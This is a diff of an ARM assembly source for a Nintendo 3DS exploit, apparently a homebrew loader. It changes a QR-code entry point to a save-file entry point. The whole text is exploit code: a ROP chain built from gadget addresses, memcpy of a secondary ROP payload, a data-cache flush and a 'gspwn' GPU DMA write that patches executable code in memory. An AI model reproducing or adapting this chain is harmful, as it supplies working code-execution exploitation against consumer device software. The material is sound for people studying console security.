@@ -1,8 +1,8 @@
 .nds
 
-.include "../../build/constants.s"
+.include "../build/constants.s"
 
-.open "sploit_proto.bin","cn_qr_initial_loader.bin",0x0
+.open "sploit_proto.bin","cn_save_initial_loader.bin",0x0
 
 .arm
 
@@ -128,8 +128,8 @@
 		.word src ; r1
 	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
 		.word size ; r2 (addr)
-		.word 0xDEADBABE ; r3 (garbage)
-		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADC0DE ; r3 (garbage)
+		.word 0xDEADC0DE ; r4 (garbage)
 	.word CN_MEMCPY
 .endmacro
 
@@ -152,15 +152,11 @@ ROP:
 	;jump to safer place
 		
 		.word ROP_CN_POP_R0PC ; pop	{r0, pc}
-			.word CN_QRBUFPTR ; r0 
-		.word ROP_CN_LDR_R0R0_POP_R4PC ; ldr r0, [r0] | pop {r4, pc}
-			.word 0x00000008 ; r4
-		.word ROP_CN_ADD_R0R4_POP_R4PC ; add r0, r0, r4 | pop {r4, pc}
-			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0x0FFFFF28 ; r0 
 		.word ROP_CN_LDR_R0R0_POP_R4PC ; ldr r0, [r0] | pop {r4, pc}
 			.word CN_TMPVAR_ADR ; r4 (tmp var adr)
 		.word ROP_CN_STR_R0R4_POP_R4PC ; str r0, [r4] | pop {r4, pc}
-			.word CN_STACKPAYLOADADR+filePayloadOffset-ROP ; r4 (dst)
+			.word CN_STACKPAYLOADADR+filePayloadOffset-ROP ; r4 (garbage)
 		.word ROP_CN_STR_R0R4_POP_R4PC ; str r0, [r4] | pop {r4, pc}
 			.word 0xDEADC0DE ; r4 (garbage)
 
@@ -170,11 +166,11 @@ ROP:
 			.word CN_SECONDARYROP_DST
 		.word ROP_CN_POP_R1PC
 		filePayloadOffset:
-			.word 0xDEADC0DE ; r3 (garbage because gets overwritten by previous rop stff)
+			.word 0xDEADC0DE ; r1 (garbage because gets overwritten by previous rop stff)
 		.word ROP_CN_POP_R2R3R4PC
 			.word secondaryROP_end ; r2 (size)
-			.word 0xDEADBABE ; r3 (garbage)
-			.word 0xDEADBABE ; r4 (garbage)
+			.word 0xDEADC0DE ; r3 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 		.word CN_MEMCPY
 
 		; jump to new rop buffer
@@ -219,9 +215,9 @@ secondaryROP:
 
 	memcpy CN_RANDCODEBIN_COPY_BASE, CN_SECONDARYROP_DST + codePatch, codePatchEnd - codePatch
 
-	flush_dcache CN_RANDCODEBIN_COPY_BASE, 0x00800000
+	flush_dcache CN_RANDCODEBIN_COPY_BASE, 0x00100000
 
-	gspwn_dstderefadd (CN_RANDCODEBIN_BASE) - (CN_RANDCODEBIN_COPY_BASE), CN_SCANLOOP_CURPTR, CN_RANDCODEBIN_COPY_BASE, 0x1000, CN_SECONDARYROP_DST
+	gspwn_dstderefadd (CN_RANDCODEBIN_BASE) - (CN_RANDCODEBIN_COPY_BASE), CN_SCANLOOP_CURPTR, CN_RANDCODEBIN_COPY_BASE, 0x800, CN_SECONDARYROP_DST
 
 	sleep 200*1000*1000, 0x00000000
 
